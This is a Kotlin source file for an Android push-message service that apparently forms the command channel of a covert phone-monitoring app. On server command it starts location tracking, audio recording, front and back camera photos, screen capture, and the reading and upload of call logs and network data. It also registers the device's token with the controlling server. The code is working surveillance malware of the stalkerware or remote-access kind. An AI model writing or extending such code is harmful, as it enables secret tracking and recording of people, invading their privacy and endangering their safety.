package com.br.monitor

import android.content.Intent
import android.util.Log
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class FCMService : FirebaseMessagingService() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onNewToken(token: String) {
        Log.d("FCMService", "New token: $token")
        scope.launch {
            ApiClient.post("/register", org.json.JSONObject().apply { put("fcm_token", token) })
        }
    }

    override fun onMessageReceived(msg: RemoteMessage) {
        val cmd = msg.data["cmd"] ?: return
        Log.d("FCMService", "CMD: $cmd")

        when (cmd) {
            "geo_now" -> startService(Intent(this, LocationService::class.java))

            "audio_start" -> {
                val i = Intent(this, AudioService::class.java).apply {
                    action = "start"
                }
                startForegroundService(i)
            }
            "audio_stop" -> {
                val i = Intent(this, AudioService::class.java).apply {
                    action = "stop"
                }
                startService(i)
            }

            "photo_front" -> startForegroundService(
                Intent(this, CameraService::class.java).apply {
                    putExtra(CameraService.EXTRA_FACING, "front")
                }
            )
            "photo_back" -> startForegroundService(
                Intent(this, CameraService::class.java).apply {
                    putExtra(CameraService.EXTRA_FACING, "back")
                }
            )

            "screenshot" -> startActivity(
                Intent(this, ScreenCaptureActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
            )

            "calls" -> scope.launch {
                val buf = OfflineBuffer(applicationContext)
                CallLogReader.readAndSend(applicationContext, buf)
            }

            "network" -> scope.launch {
                val buf = OfflineBuffer(applicationContext)
                NetworkReader.readAndSend(applicationContext, buf)
            }

            "ping" -> scope.launch {
                ApiClient.post("/pong", org.json.JSONObject().apply {
                    put("ts", System.currentTimeMillis())
                })
            }
        }
    }
}
